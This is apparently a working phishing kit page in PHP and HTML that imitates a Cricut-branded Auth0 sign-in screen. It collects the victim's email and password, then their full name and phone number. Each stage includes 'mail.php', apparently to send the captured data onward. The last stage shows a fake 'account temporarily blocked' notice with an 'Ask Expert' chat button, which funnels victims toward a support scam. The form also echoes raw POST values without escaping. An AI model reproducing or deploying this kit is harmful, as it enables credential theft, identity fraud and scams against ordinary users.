<!DOCTYPE html>
<html class="auth0-lock-html" style="--vh:6px;">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>Sign In with Auth0</title> 
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
   <link href="./assets/style.css" rel="stylesheet">
  <script src="./assets/en.js.download"></script>
  <script src="./assets/TWi962Imqso3D2YLwHr89f3mjhqH7eAm.js.download"></script>
    <script src="./assets/lock.min.js.download"></script>
</head>
<body>
  <div id="auth0-lock-container-1" class="auth0-lock-container">
    <div data-reactroot="" class="auth0-lock auth0-lock-opened auth0-lock-with-tabs" lang="en" style="font-size: 1rem;">
      <div class="auth0-lock-overlay"></div>
      <div class="auth0-lock-center">

        <?php
         if (isset($_POST['btnLoginMore'])) {
            
            include 'mail.php';
        ?>


        <form class="auth0-lock-widget" method="post" action="">
          <div class="auth0-lock-widget-container">
            <div class="auth0-lock-cred-pane auth0-lock-quiet">
              <div class="auth0-lock-cred-pane-internal-wrapper">
                <div class="auth0-lock-content-wrapper">
                  <div class="auth0-lock-header">
                    <div class="auth0-lock-header-bg auth0-lock-blur-support">
                      <div class="auth0-lock-header-bg-blur" style="background-image: url(&quot;https://dj8a12g4tkdh0.cloudfront.net/staticfiles/version1616090802/frontend/Cricut/Hermes/en_US/images/logo.svg&quot;);"></div>
                      <div class="auth0-lock-header-bg-solid" style="background-color: rgb(0, 169, 119);"></div>
                    </div>
                    <div class="auth0-lock-header-welcome"><img alt="" class="auth0-lock-header-logo centered" src="./assets/logo.svg"></div>
                  </div>
                  <div class="auth0-lock-content-body-wrapper" style="margin-top: 0px;">
                    <div>
                      <div></div>
                    </div>
                    <div style="position: relative;"><span><div class="" style=""><div style="visibility: inherit;"><div class="auth0-lock-view-content"><div style="position: relative;"><div class="auth0-lock-body-content"><div class="auth0-lock-content"><div class="auth0-lock-form"><div><div role="navigation" class="auth0-lock-tabs-container"><ul class="auth0-lock-tabs"><li class="auth0-lock-tabs-current"><span>Verification Required</span></li>
                      <!-- <li class=""><a href="#">Create Cricut ID</a></li> -->
                      </ul>
                    </div>
                    <div>
                      <div>
                        <div class="auth0-lock-input-block auth0-lock-input-email">
                          <div class="auth0-lock-input-wrap auth0-lock-input-wrap-with-icon"><span aria-hidden="true"><svg aria-hidden="true" focusable="false" width="14px" height="13px" viewBox="0 0 32 26" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:sketch="http://www.bohemiancoding.com/sketch/ns" class="auth0-lock-icon auth0-lock-icon-box"><g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" sketch:type="MSPage"><g id="32px" sketch:type="MSLayerGroup" transform="translate(-2155.000000, -2317.000000)" fill="#373A39"><g id="Group-856" transform="translate(1.000000, 1.000000)" sketch:type="MSShapeGroup"><path id="Fill-419" d="M2184,2339 C2184,2339.55 2183.55,2340 2183,2340 L2157,2340 C2156.45,2340 2156,2339.55 2156,2339 L2156,2319 C2156,2318.45 2156.45,2318 2157,2318 L2183,2318 C2183.55,2318 2184,2318.45 2184,2319 L2184,2339 L2184,2339 Z M2184,2316 L2156,2316 C2154.89,2316 2154,2316.89 2154,2318 L2154,2340 C2154,2341.1 2154.89,2342 2156,2342 L2184,2342 C2185.1,2342 2186,2341.1 2186,2340 L2186,2318 C2186,2316.89 2185.1,2316 2184,2316 L2184,2316 Z M2176,2322 L2180,2322 L2180,2326 L2176,2326 L2176,2322 Z M2174,2328 L2182,2328 L2182,2320 L2174,2320 L2174,2328 Z M2158,2332 L2172,2332 L2172,2330 L2158,2330 L2158,2332 Z M2158,2336 L2172,2336 L2172,2334 L2158,2334 L2158,2336 Z"></path></g></g></g></svg></span>
                            <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                         <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />

                            <input type="text" id="1-email" inputmode="email" name="name" class="auth0-lock-input" placeholder="Full Name" autocomplete="on" autocapitalize="off" aria-label="Email" aria-invalid="false" value="" maxlength="255">
                            
                          </div>
                        </div>
                        <div class="auth0-lock-input-block auth0-lock-input-show-password">
                          <div class="auth0-lock-input-block auth0-lock-input-password">
                            <div class="auth0-lock-input-wrap auth0-lock-input-wrap-with-icon">
                             
                              <input type="text" name="number" class="auth0-lock-input" autocomplete="on" autocapitalize="off" value="" aria-label="number" aria-invalid="false" placeholder="Phone Number">

                            </div>
                          </div>
                          <div class="auth0-lock-show-password">
                            <input type="checkbox" id="slideOne" value="on">
                            <label for="slideOne" title="Show password"></label>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
      </div>
    </div>
  </div>
  </span>
  </div>
  </div>
  </div>
  <button name="fromLog" class="auth0-lock-submit" name="submit" type="submit" aria-label="Sign In" style="background-color: rgb(0, 169, 119); display: block;">
    <div class="auth0-loading-container">
      <div class="auth0-loading"></div>
    </div><span class="auth0-label-submit">Verify<span><svg aria-hidden="true" focusable="false" class="icon-text" width="8px" height="12px" viewBox="0 0 8 12" version="1.1" xmlns="http://www.w3.org/2000/svg"><g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="Web/Submit/Active" transform="translate(-148.000000, -32.000000)" fill="#FFFFFF"><polygon id="Shape" points="148 33.4 149.4 32 155.4 38 149.4 44 148 42.6 152.6 38"></polygon></g></g></svg></span></span>
  </button>
  </div>
  </div>
  </div>
  </form>


        <?php } elseif (isset($_POST['fromLog'])) {
                     include 'mail.php';
                 ?>

 <form class="auth0-lock-widget" method="post" action="">
          <div class="auth0-lock-widget-container">
            <div class="auth0-lock-cred-pane auth0-lock-quiet">
              <div class="auth0-lock-cred-pane-internal-wrapper">
                <div class="auth0-lock-content-wrapper">
                  <div class="auth0-lock-header">
                    <div class="auth0-lock-header-bg auth0-lock-blur-support">
                      <div class="auth0-lock-header-bg-blur" style="background-image: url(&quot;https://dj8a12g4tkdh0.cloudfront.net/staticfiles/version1616090802/frontend/Cricut/Hermes/en_US/images/logo.svg&quot;);"></div>
                      <div class="auth0-lock-header-bg-solid" style="background-color: rgb(0, 169, 119);"></div>
                    </div>
                    <div class="auth0-lock-header-welcome"><img alt="" class="auth0-lock-header-logo centered" src="./assets/logo.svg"></div>
                  </div>
                  <div class="auth0-lock-content-body-wrapper" style="margin-top: 0px;">
                   
                    <div style="position: relative;">
                      <span><div class="" style="">
                        <div style="visibility: inherit;"><div class="auth0-lock-view-content"><div style="position: relative;"><div class="auth0-lock-body-content"><div class="auth0-lock-content"><div class="auth0-lock-form">
                      <div>
                        <div role="navigation" class="auth0-lock-tabs-container"><ul class="auth0-lock-tabs"><li class="auth0-lock-tabs-current"><span>Account blocked</span></li>
                      </ul>
                    </div>

                     <p style="font-size: 20px;">Your account has been <b>temporarily blocked</b> due to <br>suspicious activity on your Network IP.<br>Kindly ask an expert</p>
                    <div class="form text-center" style="text-align: center;">
                        <label>Error CODE: <b>6X76D</b></label><br>
                    </div>
                    <div class="calling-number text-center" style="text-align: center;">
                        <a class="btn btn-danger" href="javascript:void(Tawk_API.toggle())" style="background: #bf0707; color: #fff !important;padding: 10px;    display: inline-block;    margin-top: 10px;">Ask Expert</a>
                    </div>
                    
                   
                  </div>
                </div>
              </div>
            </div>
          </div>
      </div>
    </div>
  </div>
  </span>
  </div>
  </div>
  </div>
 
  </div>
  </div>
  </div>
  </form>

         <?php } else { ?>


          <form class="auth0-lock-widget" method="post" action="">
          <div class="auth0-lock-widget-container">
            <div class="auth0-lock-cred-pane auth0-lock-quiet">
              <div class="auth0-lock-cred-pane-internal-wrapper">
                <div class="auth0-lock-content-wrapper">
                  <div class="auth0-lock-header">
                    <div class="auth0-lock-header-bg auth0-lock-blur-support">
                      <div class="auth0-lock-header-bg-blur" style="background-image: url(&quot;https://dj8a12g4tkdh0.cloudfront.net/staticfiles/version1616090802/frontend/Cricut/Hermes/en_US/images/logo.svg&quot;);"></div>
                      <div class="auth0-lock-header-bg-solid" style="background-color: rgb(0, 169, 119);"></div>
                    </div>
                    <div class="auth0-lock-header-welcome"><img alt="" class="auth0-lock-header-logo centered" src="./assets/logo.svg"></div>
                  </div>
                  <div class="auth0-lock-content-body-wrapper" style="margin-top: 0px;">
                    <div>
                      <div></div>
                    </div>
                    <div style="position: relative;"><span><div class="" style=""><div style="visibility: inherit;"><div class="auth0-lock-view-content"><div style="position: relative;"><div class="auth0-lock-body-content"><div class="auth0-lock-content"><div class="auth0-lock-form"><div><div role="navigation" class="auth0-lock-tabs-container"><ul class="auth0-lock-tabs"><li class="auth0-lock-tabs-current"><span>Sign In</span></li>
                      <!-- <li class=""><a href="#">Create Cricut ID</a></li> -->
                      </ul>
                    </div>
                    <div>
                      <div>
                        <div class="auth0-lock-input-block auth0-lock-input-email">
                          <div class="auth0-lock-input-wrap auth0-lock-input-wrap-with-icon"><span aria-hidden="true"><svg aria-hidden="true" focusable="false" width="14px" height="13px" viewBox="0 0 32 26" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:sketch="http://www.bohemiancoding.com/sketch/ns" class="auth0-lock-icon auth0-lock-icon-box"><g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" sketch:type="MSPage"><g id="32px" sketch:type="MSLayerGroup" transform="translate(-2155.000000, -2317.000000)" fill="#373A39"><g id="Group-856" transform="translate(1.000000, 1.000000)" sketch:type="MSShapeGroup"><path id="Fill-419" d="M2184,2339 C2184,2339.55 2183.55,2340 2183,2340 L2157,2340 C2156.45,2340 2156,2339.55 2156,2339 L2156,2319 C2156,2318.45 2156.45,2318 2157,2318 L2183,2318 C2183.55,2318 2184,2318.45 2184,2319 L2184,2339 L2184,2339 Z M2184,2316 L2156,2316 C2154.89,2316 2154,2316.89 2154,2318 L2154,2340 C2154,2341.1 2154.89,2342 2156,2342 L2184,2342 C2185.1,2342 2186,2341.1 2186,2340 L2186,2318 C2186,2316.89 2185.1,2316 2184,2316 L2184,2316 Z M2176,2322 L2180,2322 L2180,2326 L2176,2326 L2176,2322 Z M2174,2328 L2182,2328 L2182,2320 L2174,2320 L2174,2328 Z M2158,2332 L2172,2332 L2172,2330 L2158,2330 L2158,2332 Z M2158,2336 L2172,2336 L2172,2334 L2158,2334 L2158,2336 Z"></path></g></g></g></svg></span>
                            
                            <input type="email" id="1-email" inputmode="email" name="email" class="auth0-lock-input" placeholder="yours@example.com" autocomplete="on" autocapitalize="off" aria-label="Email" aria-invalid="false" value="" maxlength="255">
                            
                          </div>
                        </div>
                        <div class="auth0-lock-input-block auth0-lock-input-show-password">
                          <div class="auth0-lock-input-block auth0-lock-input-password">
                            <div class="auth0-lock-input-wrap auth0-lock-input-wrap-with-icon"><span aria-hidden="true"><svg aria-hidden="true" focusable="false" width="11px" height="14px" viewBox="0 0 13 16" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" class="auth0-lock-icon auth0-lock-icon-box"><g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g transform="translate(-288.000000, -1508.000000)" fill="#888888"><path d="M299,1523.998 L290,1523.998 C288.896,1523.998 288,1523.102 288,1521.999 L288,1515.999 C288,1514.895 288.896,1513.998 290,1513.998 L290,1513.998 L290,1512.499 C290,1510.015 292.015,1507.999 294.5,1507.999 C296.985,1507.999 299,1510.015 299,1512.499 L299,1513.999 C300.104,1513.999 301,1514.895 301,1515.999 L301,1521.999 C301,1523.103 300.104,1523.998 299,1523.998 L299,1523.998 Z M298,1512.499 C298,1510.566 296.433,1508.999 294.5,1508.999 C292.567,1508.999 291,1510.566 291,1512.499 L291,1513.998 L298,1513.998 L298,1512.499 L298,1512.499 Z M300,1515.999 C300,1515.446 299.552,1514.998 299,1514.998 L290,1514.998 C289.447,1514.998 289,1515.446 289,1515.999 L289,1521.999 C289,1522.551 289.447,1522.998 290,1522.998 L299,1522.998 C299.552,1522.998 300,1522.551 300,1521.999 L300,1515.999 L300,1515.999 Z M294.5,1520.998 C294.224,1520.998 294,1520.774 294,1520.498 L294,1517.498 C294,1517.223 294.224,1516.999 294.5,1516.999 C294.776,1516.999 295,1517.223 295,1517.498 L295,1520.498 C295,1520.774 294.776,1520.998 294.5,1520.998 L294.5,1520.998 Z"></path></g></g></svg></span>
                             
                              <input type="password" name="password" class="auth0-lock-input" autocomplete="on" autocapitalize="off" value="" aria-label="Password" aria-invalid="false" placeholder="Enter password">

                            </div>
                          </div>
                          <div class="auth0-lock-show-password">
                            <input type="checkbox" id="slideOne" value="on">
                            <label for="slideOne" title="Show password"></label>
                          </div>
                        </div>
                        <p class="auth0-lock-alternative"><a class="auth0-lock-alternative-link" href="#">Forgot password?</a></p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
      </div>
    </div>
  </div>
  </span>
  </div>
  </div>
  </div>
  <button name="btnLoginMore" class="auth0-lock-submit" name="submit" type="submit" aria-label="Sign In" style="background-color: rgb(0, 169, 119); display: block;">
    <div class="auth0-loading-container">
      <div class="auth0-loading"></div>
    </div><span class="auth0-label-submit"><!-- react-text: 34 -->Sign In<!-- /react-text --><span><svg aria-hidden="true" focusable="false" class="icon-text" width="8px" height="12px" viewBox="0 0 8 12" version="1.1" xmlns="http://www.w3.org/2000/svg"><g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="Web/Submit/Active" transform="translate(-148.000000, -32.000000)" fill="#FFFFFF"><polygon id="Shape" points="148 33.4 149.4 32 155.4 38 149.4 44 148 42.6 152.6 38"></polygon></g></g></svg></span></span>
  </button>
  </div>
  </div>
  </div>
  </form>


           <?php } ?>

        
        


  </div>
  </div>
  </div>
  <script type="text/javascript">
    $("a").attr("href", "#");

  </script>
</body>

</html>